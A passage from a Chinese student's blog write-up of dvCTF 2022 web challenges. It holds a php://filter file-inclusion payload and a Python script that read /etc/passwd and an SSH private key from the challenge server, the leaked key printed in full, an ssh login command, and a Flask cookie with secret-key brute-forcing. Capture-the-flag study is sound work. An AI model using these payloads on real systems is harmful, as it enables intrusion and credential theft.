class="line">games:x:5:60:games:/usr/games:/usr/sbin/nologin</span><br><span class="line">man:x:6:12:man:/var/cache/man:/usr/sbin/nologin</span><br><span class="line">lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin</span><br><span class="line">mail:x:8:8:mail:/var/mail:/usr/sbin/nologin</span><br><span class="line">news:x:9:9:news:/var/spool/news:/usr/sbin/nologin</span><br><span class="line">uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin</span><br><span class="line">proxy:x:13:13:proxy:/bin:/usr/sbin/nologin</span><br><span class="line">www-data:x:1000:33:www-data:/var/www:/usr/sbin/nologin</span><br><span class="line">backup:x:34:34:backup:/var/backups:/usr/sbin/nologin</span><br><span class="line">list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin</span><br><span class="line">irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin</span><br><span class="line">gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin</span><br><span class="line">nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin</span><br><span class="line">systemd-timesync:x:100:102:systemd Time Synchronization,,,:/run/systemd:/bin/false</span><br><span class="line">systemd-network:x:101:103:systemd Network Management,,,:/run/systemd/netif:/bin/false</span><br><span class="line">systemd-resolve:x:102:104:systemd Resolver,,,:/run/systemd/resolve:/bin/false</span><br><span class="line">systemd-bus-proxy:x:103:105:systemd Bus Proxy,,,:/run/systemd:/bin/false</span><br><span class="line">_apt:x:104:65534::/nonexistent:/bin/false</span><br><span class="line">messagebus:x:105:109::/var/run/dbus:/bin/false</span><br><span class="line">sshd:x:106:65534::/var/run/sshd:/usr/sbin/nologin</span><br><span class="line">leonardo:x:1001:1001::/home/leonardo:/bin/bash        //(&#x8FD9;&#x4E00;&#x884C;&#x662F;&#x4E3B;&#x673A;)</span><br><span class="line">administrator:x:1002:1002::/home/administrator:/bin/bash</span><br><span class="line"></span><br></pre></td></tr></table></div></figure>
+
+<p>&#xFF08;&#x7B49;&#x7B49;&#xFF0C;&#x770B;&#x4E00;&#x4E2A;&#x82F1;&#x6587;&#x535A;&#x5BA2;&#x5199;&#x53EF;&#x4EE5;&#x5728;playlistTop&#x540E;&#x9762;&#x5199;&#x4E00;&#x4E2A;ssrf&#xFF09;&#x622A;&#x4E2A;&#x56FE;&#x5427;</p>
+<img src="/2022/03/18/3-18-%E5%8D%8F%E4%BC%9A%E6%B4%BB%E5%8A%A8/image-20220320201041726.png" alt="image-20220320201041726" style="zoom:33%;">
+
+
+
+<p>&#xFF08;&#x597D;&#x7684;&#xFF0C;&#x56DE;&#x5F52;&#x6B63;&#x9898;&#xFF09;</p>
+<img src="/2022/03/18/3-18-%E5%8D%8F%E4%BC%9A%E6%B4%BB%E5%8A%A8/image-20220320201854068.png" alt="image-20220320201854068" style="zoom:50%;">
+
+<p>&#x7528;&#x4E0A;&#x9762;&#x8FD9;&#x5F20;&#x56FE;&#x7247;&#x7684;&#x6784;&#x9020;&#xFF0C;&#x7136;&#x540E;&#x67E5;&#x770B;&#x6E90;&#x4EE3;&#x7801;</p>
+<img src="/2022/03/18/3-18-%E5%8D%8F%E4%BC%9A%E6%B4%BB%E5%8A%A8/image-20220320201948988.png" alt="image-20220320201948988" style="zoom:50%;">
+
+<p>&#x554A;&#x5230;&#x8FD9;&#x91CC;&#x70B9;&#x5F00;&#x53D1;&#x73B0;&#x6253;&#x5F00;&#x662F;&#x89C6;&#x9891;&#xFF0C;&#x7136;&#x540E;&#x5C31;&#x4E0D;&#x77E5;&#x9053;&#x600E;&#x4E48;&#x53BB;&#x627E;&#x79C1;&#x94A5;&#x4E86;</p>
+<p>&#x2014;&#x2014;&#x2014;&#x2014;&#x2014;&#x2014;&#x2014;&#x2014;&#x2014;&#x2014;&#x2014;&#x2014;&#x2014;&#x2014;&#x2014;&#x2014;&#x2014;&#x2014;&#x2014;&#x2014;&#x95EE;&#x9898;&#x89E3;&#x51B3;&#x4E86;&#xFF0C;&#x53EF;&#x7231;&#x7684;&#x5C0F;&#x4F19;&#x4F34;&#x63D0;&#x9192;&#x6211;&#x6362;&#x4E00;&#x4E2A;payload</p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">view-source:http://challs.dvc.tf:51080/?MyTop5=1&amp;playlistTop=php://filter/convert.base64-encode/resource=/home/leonardo/.ssh/id_rsa</span><br></pre></td></tr></table></div></figure>
+
+<img src="/2022/03/18/3-18-%E5%8D%8F%E4%BC%9A%E6%B4%BB%E5%8A%A8/image-20220323133812614.png" alt="image-20220323133812614" style="zoom:50%;">
+
+<p>&#x7136;&#x540E;&#x5C31;&#x662F;&#x89C6;&#x9891;&#x540E;&#x9762;&#x7684;base64&#x89E3;&#x7801;&#x5C31;&#x53EF;&#x4EE5;&#x5F97;&#x5230;base64&#xFF08;&#x4E0D;&#x8FC7;&#x6211;&#x8FD8;&#x662F;&#x60F3;&#x77E5;&#x9053;&#x8FD9;&#x4E2A;&#x6587;&#x4EF6;&#x662F;&#x600E;&#x4E48;&#x6CC4;&#x9732;&#x51FA;&#x6765;&#x7684;&#xFF0C;&#x4E0A;&#x5468;&#x6CA1;&#x542C;&#x61C2;&#xFF09;</p>
+<p>&#x554A;&#x7136;&#x540E;&#x53D1;&#x73B0;&#x81EA;&#x5DF1;&#x5BF9;bin/sh&#x8FD8;&#x4E0D;&#x4E86;&#x89E3; &#x7136;&#x540E;&#x53C8;&#x53BB;&#x4E92;&#x8054;&#x7F51;&#x4E0A;&#x67E5;&#x627E;</p>
+<p>[bin/sh](<a target="_blank" rel="noopener" href="https://www.jianshu.com/p/2605d54f35ad?msclkid=89d963eba84811ec9ac8a21c112d0eda">#! /bin/bash - &#x7B80;&#x4E66; (jianshu.com)</a>)</p>
+<img src="/2022/03/18/3-18-%E5%8D%8F%E4%BC%9A%E6%B4%BB%E5%8A%A8/image-20220320202639014.png" alt="image-20220320202639014" style="zoom:50%;">
+
+<p>&#x4E0B;&#x9762;&#x6709;&#x4E00;&#x5F20;&#x597D;&#x56FE;&#xFF0C;&#x76D7;&#x4E86;&#xFF08;(&#xFF1E;&#x4EBA;&#xFF1C;&#xFF1B;)&#x5BF9;&#x4E0D;&#x8D77;&#xFF09;</p>
+<img src="/2022/03/18/3-18-%E5%8D%8F%E4%BC%9A%E6%B4%BB%E5%8A%A8/image-20220320202725949.png" alt="image-20220320202725949" style="zoom:50%;">
+
+<p>&#xFF08;&#x55EF;&#xFF0C;&#x8DD1;&#x9898;&#x4E86;&#xFF0C;&#x7EE7;&#x7EED;&#xFF0C;&#x8FD8;&#x662F;&#x90A3;&#x7BC7;&#x82F1;&#x6587;&#x535A;&#x5BA2;&#xFF09;</p>
+<p>&#x8FD9;&#x4E2A;&#x535A;&#x5BA2;&#x7ED9;&#x4E86;&#x4E00;&#x4E2A;&#x811A;&#x672C;&#xFF0C;&#x4E4B;&#x524D;&#x662F;&#x76F4;&#x63A5;&#x53EF;&#x4EE5;&#x8DD1;&#x51FA;&#x90A3;&#x4E2A;&#x4EC0;&#x4E48;&#x7528;&#x6237;&#x4E3B;&#x673A;&#x7684;&#xFF0C;&#x540E;&#x6765;&#x7528;&#x540C;&#x6837;&#x7684;&#x4EE3;&#x7801;&#x53EF;&#x4EE5;&#x8DD1;&#x51FA;&#x79C1;&#x94A5;&#xFF08;&#x611F;&#x8C22;&#x5927;&#x4F6C;&#x7684;&#x4EE3;&#x7801;&#x5206;&#x4EAB;&#xFF09;</p>
+<figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">lines = [i <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">50</span>)]</span><br><span class="line">target_file = []</span><br><span class="line"><span class="keyword">for</span> l <span class="keyword">in</span> lines:</span><br><span class="line">  r = requests.get(<span class="string">&apos;http://challs.dvc.tf:51080/?MyTop5={}&amp;playlistTop=/etc/passwd&apos;</span>.<span class="built_in">format</span>(l))</span><br><span class="line">  target_line = re.findall(<span class="string">r&apos;embed\/(.*)\n&apos;</span>, r.text)</span><br><span class="line">  <span class="built_in">print</span>(target_line[<span class="number">0</span>])</span><br><span class="line">  target_file.append(target_line[<span class="number">0</span>])</span><br><span class="line"></span><br><span class="line">file_content = <span class="string">&apos;\n&apos;</span>.join(target_file)</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&apos;output_file.txt&apos;</span>, <span class="string">&apos;w&apos;</span>) <span class="keyword">as</span> out_file:</span><br><span class="line">  out_file.write(file_content)</span><br></pre></td></tr></table></div></figure>
+
+<img src="/2022/03/18/3-18-%E5%8D%8F%E4%BC%9A%E6%B4%BB%E5%8A%A8/image-20220320204625886.png" alt="image-20220320204625886" style="zoom:50%;">
+
+<p>&#x4F46;&#x662F;top5&#x90A3;&#x4E2A;&#x5730;&#x65B9;&#x8FD8;&#x662F;&#x6CA1;&#x592A;&#x660E;&#x767D;&#x4E3A;&#x4EC0;&#x4E48;&#x586B;&#x7684;&#x662F;{}&#x6539;URL&#x4E3A;/home/leonado/.ssh/id_rsa&#x2014;&#x2014;&#x2014;&#x2014;&#x2014;&#x2014;&#x95EE;&#x9898;&#x5DF2;&#x89E3;&#x51B3;&#x89C1;&#x4E0A; &#x7528;&#x4E86;php://filter &#x8BA9;&#x6587;&#x4EF6;&#x6CC4;&#x9732;</p>
+<p>&#x8DD1;&#x51FA;&#x6765;<img src="/2022/03/18/3-18-%E5%8D%8F%E4%BC%9A%E6%B4%BB%E5%8A%A8/image-20220320211403759.png" alt="image-20220320211403759" style="zoom:50%;"></p>
+
+        <h3 id="&#x8FD9;&#x91CC;&#x662F;&#x79C1;&#x94A5;">
+          <a href="#&#x8FD9;&#x91CC;&#x662F;&#x79C1;&#x94A5;" class="heading-link"><i class="undefined"></i></a><a href="#&#x8FD9;&#x91CC;&#x662F;&#x79C1;&#x94A5;" class="headerlink" title="&#x8FD9;&#x91CC;&#x662F;&#x79C1;&#x94A5;"></a>&#x8FD9;&#x91CC;&#x662F;&#x79C1;&#x94A5;</h3>
+      <figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">-----BEGIN OPENSSH PRIVATE KEY-----</span><br><span class="line">b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn</span><br><span class="line">NhAAAAAwEAAQAAAYEA3TIqLP319AZbwx2ZbFewWwbPgAB7XiPfxUPc5EcB0hUSrSnr7l0X</span><br><span class="line">Ymf1FGPdoC72jhtC8pzqJ8mcCExVQxCUBxHzIIbmU1Y9Fl9Nz+CpQ+P6piZB+hw9uWPFGw</span><br><span class="line">XHzV97kOcWTDGNZ8j+c9h55Rr9sCM/uTI99elhCs0C9fwfI0C9kGGpFBoDi9s3A/X+ewC+</span><br><span class="line">ii4vVXfXGaC+7yDL6mfTfA1xyyJbqEbO3geQTyNwqF0b4bsPoV+IN+ZLI25uobggwvfEAH</span><br><span class="line">hneuQDx4dt9FQHHhd9LX1VPBnhSRAO8hqFKvBkOAHIYitT/bFdPZb71kH/il8fxUiVnBqm</span><br><span class="line">GBp+rK1akqEzwDwsASOIhllDBd+0MWHK80d7XWsTQ1Bfyl8i7vDadJW34Fb53nYdGe0+Ot</span><br><span class="line">94sO7FVJwK1EHbq1rNxuF51+CNOvF6AtP3Q9GZldzmyAEDteVEQW6waS63CDCzUVBPrBM+</span><br><span class="line">t8r17/J3g0y0ooSkujrjpAdV1w6kudzgFFsOHiRhAAAFiDaUbzw2lG88AAAAB3NzaC1yc2</span><br><span class="line">EAAAGBAN0yKiz99fQGW8MdmWxXsFsGz4AAe14j38VD3ORHAdIVEq0p6+5dF2Jn9RRj3aAu</span><br><span class="line">9o4bQvKc6ifJnAhMVUMQlAcR8yCG5lNWPRZfTc/gqUPj+qYmQfocPbljxRsFx81fe5DnFk</span><br><span class="line">wxjWfI/nPYeeUa/bAjP7kyPfXpYQrNAvX8HyNAvZBhqRQaA4vbNwP1/nsAvoouL1V31xmg</span><br><span class="line">vu8gy+pn03wNccsiW6hGzt4HkE8jcKhdG+G7D6FfiDfmSyNubqG4IML3xAB4Z3rkA8eHbf</span><br><span class="line">RUBx4XfS19VTwZ4UkQDvIahSrwZDgByGIrU/2xXT2W+9ZB/4pfH8VIlZwaphgafqytWpKh</span><br><span class="line">M8A8LAEjiIZZQwXftDFhyvNHe11rE0NQX8pfIu7w2nSVt+BW+d52HRntPjrfeLDuxVScCt</span><br><span class="line">RB26tazcbhedfgjTrxegLT90PRmZXc5sgBA7XlREFusGkutwgws1FQT6wTPrfK9e/yd4NM</span><br><span class="line">tKKEpLo646QHVdcOpLnc4BRbDh4kYQAAAAMBAAEAAAGAWPthNBBF7RDRwUAbBBaSf0vSFX</span><br><span class="line">AcMNbFohmWts5J0TVg+gAvRQh168ReNwGlmlbKIIie+fJdz/uupTfv5La6lc2GvMMHzOaY</span><br><span class="line">VHOqXcHG1eTUZBpn2DGcMwQLur8sjVWn47bSpXwZonKcygV/o8aj30OO0vV/L3ne6/VlB4</span><br><span class="line">eRDyFwILDoz4lXe9+H1jQTV3AJNpU1vXAkO88KgC/1WCrETNcru8fqj1tMxMzOJMfg/hnW</span><br><span class="line">qYwS0ZwYtEQUXgCCyNPEuqlaJjabbZz7UxmeCFc56aphWyAmWnq66DPPzpEXkGTZNtH3vc</span><br><span class="line">3eY0dmUQ5gDE7fV/naFNDbCQEGP80Mr77aGfeU575xlxL9hCC7XNZQRpqLqwIxXu++jJj3</span><br><span class="line">P+gWrqWPegME7BgxpjJHiYHLUBCcB1M3TTL9HGH3khw/fp3gWJlZBfDBXu8i1PIRhdTjS6</span><br><span class="line">27zgpDBJi+NzdL7inbdVrvYMpwcZvO4SViwv4IKcpI2Tlrf7rQByPpW70jSHjhVkABAAAA</span><br><span class="line">wGZ++/+vISiIVUTPl8zBQT2a2i9QunsT10d0gwKDaZZa4M/07GVWffhL2OLueBBUBiqe7U</span><br><span class="line">FjSTgfFkAW+f7H8o0ODXyp7TIb5Nv2pjfr29XyXPOHBtwb263hFGWLAFw4BU7cNZUrTWT9</span><br><span class="line">T2+dRDiuEEwITFfoqh+yPkS/gBvMcFiBCRYGku/Tz5h2BQK3KY1MOYNrtmtjJOEgtbPTcp</span><br><span class="line">8SM/kehNbY5rWECa2to5T14NVA/tZmJ7MTuatFJtxqqJeVwAAAAMEA8zj2kSyC/3oFUBkN</span><br><span class="line">JZ/xlGJyXjyq4XcZIRt809KvdAY8x3MKOP0/LiSayqK9HUzp+3S55tVo+L1yKXVf0TBVGn</span><br><span class="line">cHe6k+uCf0jSp3985COpAnfTkM5sQuxhmhXXZO5nJjwQDfS2bX60kkEkYZGEiujIK2cTMp</span><br><span class="line">CY9OXy/iVTuVZWofN9BODtb739eJLHi/w4WhHiEmFWi4c6+1dt1uu3hpjAwRRDk3fio6Jg</span><br><span class="line">CY8z98TGN8gw4LYoMLiweXcqMGSOaBAAAAwQDo0Pjc79LikkNKrWflc7P2CA362zLkloiV</span><br><span class="line">f7zIAaD0R3kWGu7yefl0pRjngjyFdwKdeCWjncjCoWAz57Bi5Fvh34giDP2fUf5AH4ifMz</span><br><span class="line">nUiKxhJFWERjQIJvnX7CS3x8ZKYE4BmpaQ1NN5DiSctJRjHlnY3JECSaSt0Lc2ynOhGBHP</span><br><span class="line">m/49jD+sBJDl7i6MELuyKGUHXCENkBDHc7kdkaDzxUqe1eelNHOBQZcpUroCYrfKQjKMlp</span><br><span class="line">/T/78KtD7XDeEAAAARbGVvbmFyZG9AcGxheWxpc3QBAg==</span><br><span class="line">-----END OPENSSH PRIVATE KEY-----</span><br><span class="line"></span><br></pre></td></tr></table></div></figure>
+
+<p>&#x5927;&#x4F6C;&#x8BF4;&#x79C1;&#x94A5;&#x540E;&#x9762;&#x8981;&#x7A7A;&#x4E00;&#x884C;</p>
+<img src="/2022/03/18/3-18-%E5%8D%8F%E4%BC%9A%E6%B4%BB%E5%8A%A8/image-20220320211557901.png" alt="image-20220320211557901" style="zoom:50%;">
+
+<p>&#x4E4B;&#x540E;&#x636E;&#x8BF4;&#x662F;&#x767B;&#x5F55;&#x670D;&#x52A1;&#x5668;&#xFF0C;&#x7AEF;&#x53E3;&#x662F;51022 &#x547D;&#x4EE4;&#x662F;&#x4E0B;&#x9762;&#x90A3;&#x4E2A;</p>
+
+        <h3 id="&#x8FD9;&#x91CC;&#x662F;&#x6307;&#x4EE4;">
+          <a href="#&#x8FD9;&#x91CC;&#x662F;&#x6307;&#x4EE4;" class="heading-link"><i class="undefined"></i></a><a href="#&#x8FD9;&#x91CC;&#x662F;&#x6307;&#x4EE4;" class="headerlink" title="&#x8FD9;&#x91CC;&#x662F;&#x6307;&#x4EE4;"></a>&#x8FD9;&#x91CC;&#x662F;&#x6307;&#x4EE4;</h3>
+      <figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh leonardo@challs.dvc.tf -p51022 -i .\id_rsa.txt</span><br></pre></td></tr></table></div></figure>
+
+<p>&#x8FD9;&#x91CC;&#x9700;&#x8981;&#x5B89;&#x88C5;ssh,-i&#x6307;&#x4EE4;&#x540E;&#x9762;&#x8DDF;&#x7684;&#x662F;&#x6587;&#x4EF6;&#xFF0C;&#x8FD9;&#x65F6;&#x9700;&#x8981;&#x5C06;&#x5F97;&#x5230;&#x7684;&#x79C1;&#x94A5;&#x653E;&#x5728;&#x865A;&#x62DF;&#x673A;&#x684C;&#x9762;&#x65B0;&#x5EFA;&#x7684;&#x4E00;&#x4E2A;.txt&#x6587;&#x4EF6;&#xFF08;&#x6587;&#x4EF6;&#x8981;&#x653E;&#x540C;&#x540D;&#x6587;&#x4EF6;&#x5939;&#xFF01;&#xFF01;&#xFF01;&#xFF09;&#x91CC;&#x3002;&#x590D;&#x4E60;&#x4E86;&#x65B0;&#x5EFA;.txt&#x6587;&#x4EF6;&#x7684;&#x6307;&#x4EE4;</p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo gedit</span><br></pre></td></tr></table></div></figure>
+
+<img src="/2022/03/18/3-18-%E5%8D%8F%E4%BC%9A%E6%B4%BB%E5%8A%A8/image-20220322235946824.png" alt="image-20220322235946824" style="zoom:50%;">
+
+
+
+<p>&#x554A;&#x4E4B;&#x540E;&#x5C31;&#x662F;&#x75DB;&#x82E6;&#x7684;&#x5B89;&#x88C5;Ubuntu&#x63D2;&#x4EF6;&#x65F6;&#x5019;&#x4E86;</p>
+<p>&#x60F3;&#x88C5;ssh&#xFF0C;&#x62A5;&#x9519;&#xFF0C;&#x590D;&#x5236;&#x62A5;&#x9519;&#x8BED;&#x53E5;&#x4E0A;&#x7F51;&#x641C;&#xFF0C;&#x9700;&#x8981;&#x88C5;vim</p>
+<p>&#x60F3;&#x88C5;vim&#xFF0C;&#x62A5;&#x9519;&#xFF0C;&#x590D;&#x5236;&#x62A5;&#x9519;&#x8BED;&#x53E5;&#x4E0A;&#x7F51;&#x641C;&#xFF0C;</p>
+<p>&#x8BF4;dns&#x6CA1;&#x8BBE;&#x7F6E;&#x5BF9;&#xFF0C;&#x53BB;&#x8BD5;&#x4E86;&#xFF0C;&#x4E0D;&#x77E5;&#x9053;&#x600E;&#x4E48;&#x4FDD;&#x5B58;IP&#xFF0C;&#x554A;&#xFF0C;&#x600E;&#x4E48;&#x4F1A;&#x8FD9;&#x6837;T_T</p>
+<p>//&#x8FD9;&#x91CC;&#x5F00;&#x59CB;&#x8BB0;&#x5F55;&#x4E00;&#x4E0B;&#x62A5;&#x9519;&#x5427;&#xFF0C;&#x4E4B;&#x524D;&#x5728;Windows&#x7684;cmd&#x7A97;&#x53E3;&#x6709;&#x4E2A;</p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">permanently added to the list of known hosts</span><br></pre></td></tr></table></div></figure>
+
+<p>&#x62A5;&#x9519;&#xFF0C;&#x540E;&#x6765;&#x5F97;&#x77E5;&#x4F3C;&#x4E4E;Windows&#x6CA1;&#x6709;ssh&#x670D;&#x52A1;&#xFF1F;</p>
+<p>&#x8F6C;&#x53BB;Ubuntu&#x7684;linux</p>
+<img src="/2022/03/18/3-18-%E5%8D%8F%E4%BC%9A%E6%B4%BB%E5%8A%A8/image-20220320230637588.png" alt="image-20220320230637588" style="zoom:50%;">
+
+
+
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Unable to fetch some archives, maybe run apt-get update or try with --fix-missing?</span><br></pre></td></tr></table></div></figure>
+
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;/etc/resolvconf/resolv.conf.d/base&quot; E212: Can&apos;t open file for writing</span><br></pre></td></tr></table></div></figure>
+
+<img src="/2022/03/18/3-18-%E5%8D%8F%E4%BC%9A%E6%B4%BB%E5%8A%A8/image-20220320233941101.png" alt="image-20220320233941101" style="zoom:33%;">
+
+<p><a href="%5B(27%E6%9D%A1%E6%B6%88%E6%81%AF">&#x4E00;&#x6761;&#x4FEE;&#x6539;dns&#x7684;&#x535A;&#x5BA2;</a> Ubuntu &#x4F7F;&#x7528; apt-get&#x547D;&#x4EE4;&#x5931;&#x6548;&#xFF0C;Failed to fetch <a target="_blank" rel="noopener" href="http://cn.archive.ubuntu.com/ubuntu/dists/precise/InRelease_%E6%97%A9%E5%AE%89%EF%BC%8C%E6%89%93%E5%B7%A5%E4%BA%BA%E7%9A%84%E5%8D%9A%E5%AE%A2-CSDN%E5%8D%9A%E5%AE%A2](https://blog.csdn.net/qq_36908841/article/details/81003666)">http://cn.archive.ubuntu.com/ubuntu/dists/precise/InRelease_&#x65E9;&#x5B89;&#xFF0C;&#x6253;&#x5DE5;&#x4EBA;&#x7684;&#x535A;&#x5BA2;-CSDN&#x535A;&#x5BA2;](https://blog.csdn.net/qq_36908841/article/details/81003666)</a>)</p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Failed to fetch http://us.archive.ubuntu.com/ubuntu/dists/focal/InRelease Temporary failure resolving &apos;us.archive.ubuntu.com&apos;</span><br></pre></td></tr></table></div></figure>
+
+<p>[&#x5B89;&#x88C5;vim](<a target="_blank" rel="noopener" href="https://www.jianshu.com/p/86bf7e797a68">sudo vim&#x62A5;&#x9519;command not found&#x89E3;&#x51B3;&#x529E;&#x6CD5; - &#x7B80;&#x4E66; (jianshu.com)</a>)</p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo: vim: command not found</span><br></pre></td></tr></table></div></figure>
+
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Temporary failure resolving &apos;us.archive.ubuntu.com&apos;</span><br></pre></td></tr></table></div></figure>
+
+
+
+<p>[&#x4E00;&#x4E2A;english&#x6709;wp&#x7684;&#x5927;&#x4F6C;&#x535A;&#x5BA2;](<a target="_blank" rel="noopener" href="https://kashmir54.github.io/ctfs/dvCTF2022/?msclkid=476dd100a84611ec998c14211358970e#davincis-playlist--part-1">CTF - dvCTF 2022 | Kashmir54</a>)</p>
+<p>[&#x4E00;&#x4E2A;&#x4E2D;&#x6587;&#x6709;wp&#x7684;&#x5927;&#x4F6C;&#x535A;&#x5BA2;](<a target="_blank" rel="noopener" href="http://y24.top/2022/03/14/davincictf-2022/">DVCTF 2022+UTCTF 2022 &#x2013; Shanks (y24.top)</a>)</p>
+<p>&#x597D;&#x4E86;&#xFF0C;ssh&#x670D;&#x52A1;&#x662F;&#x7528;&#x4E86;&#xFF0C;&#x4F46;&#x662F;&#xFF0C;&#x4EE4;&#x4EBA;&#x4F24;&#x5FC3;&#x7684;&#x662F;&#xFF0C;&#x8FD8;&#x662F;&#x4E0D;&#x77E5;&#x9053;&#x600E;&#x6837;&#x5C06;&#x79C1;&#x94A5;&#x4E0A;&#x4F20;&#x5230;&#x8FDC;&#x7AEF;&#x3002;</p>
+<p>&#x597D;&#x7684;&#xFF0C;&#x6211;&#x7D2F;&#x4E86;T_T&#xFF0C;&#x4E0D;&#x80FD;&#x518D;&#x71AC;&#x591C;&#x4E86;&#xFF0C;&#x71AC;&#x591C;&#x592A;&#x4F24;&#x8EAB;&#x4F53;&#x4E86;&#x3002;</p>
+
+        <h2 id="Web-CyberStreak-v1-0">
+          <a href="#Web-CyberStreak-v1-0" class="heading-link"><i class="undefined"></i></a><a href="#Web-CyberStreak-v1-0" class="headerlink" title="Web CyberStreak v1.0"></a>Web CyberStreak v1.0</h2>
+      <p>&#x8FD9;&#x662F;&#x9898;&#x76EE;&#x63CF;&#x8FF0;</p>
+<img src="/2022/03/18/3-18-%E5%8D%8F%E4%BC%9A%E6%B4%BB%E5%8A%A8/image-20220321124517422.png" alt="image-20220321124517422" style="zoom:50%;">
+
+<p>&#x7528;wappaplyzer&#x67E5;&#x770B;&#x6846;&#x67B6;</p>
+<img src="/2022/03/18/3-18-%E5%8D%8F%E4%BC%9A%E6%B4%BB%E5%8A%A8/image-20220321124557997.png" alt="image-20220321124557997" style="zoom:50%;">
+
+<p>&#x2014;&#x2014;&#x2014;-&#x4E32;&#x9898;&#x4E86;&#xFF01;&#x2014;&#x2014;&#x2013;&#x67E5;&#x770B;cookie&#x5C31;&#x5728;&#x5F00;&#x53D1;&#x8005;&#x9009;&#x9879;&#x4E2D;&#x7684;application&#x9009;&#x9879;&#x4E2D;</p>
+<img src="/2022/03/18/3-18-%E5%8D%8F%E4%BC%9A%E6%B4%BB%E5%8A%A8/image-20220321125150399.png" alt="image-20220321125150399" style="zoom:50%;">
+
+<p>&#x83B7;&#x53D6;&#x5230;cookie</p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">eyJ1c2VybmFtZSI6InJhcmFyYSJ9.YjgEUw.Ac40p0NBRzAxK0tqGF7hhKtmQvo</span><br></pre></td></tr></table></div></figure>
+
+<p>(&#x9047;&#x5230;&#x51E0;&#x4E2A;&#x65B0;&#x6982;&#x5FF5; 502 bad gate&#x8FD9;&#x4E2A;&#x72B6;&#x6001;&#x7801; ,&#x4EE5;&#x53CA;dns&#x5237;&#x65B0;&#x7F13;&#x5B58;)</p>
+<p>[hacktricks](<a target="_blank" rel="noopener" href="https://book.hacktricks.xyz/">HackTricks - HackTricks</a>)</p>
+<img src="/2022/03/18/3-18-%E5%8D%8F%E4%BC%9A%E6%B4%BB%E5%8A%A8/image-20220321130440036.png" alt="image-20220321130440036" style="zoom:50%;">
+
+
+
+<p>&#x7206;&#x7834;flask&#x7684;secret key</p>
+<img src="/2022/03/18/3-18-%E5%8D%8F%E4%BC%9A%E6%B4%BB%E5%8A%A8/image-20220321130800238.png" alt="image-20220321130800238" style="zoom:50%;">
+
+
+        <h1 id="error-about-Linux">
+          <a href="#error-about-Linux" class="heading-link"><i class="undefined"></i></a><a href="#error-about-Linux" class="headerlink" title="error about Linux"></a>error about Linux</h1>
+      <p>&#x8FD9;&#x65F6;&#x6253;&#x5F00;Ubuntu&#xFF0C;&#x53D1;&#x73B0;pip install &#x6CA1;&#x6CD5;&#x7528;&#xFF0C;&#x4F24;&#x5FC3;</p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pip install flask-unsign -i http://pypi.douban.com/simple/ --trusted-host pypi.douban.com</span><br><span class="line"></span><br></pre></td></tr></table></div></figure>
+
+<p>&#x542C;&#x8BF4;&#x8981;&#x66F4;&#x65B0;&#x955C;&#x50CF;&#xFF0C;&#x4E0D;&#x77E5;&#x9053;&#x662F;&#x5E72;&#x4EC0;&#x4E48;</p>
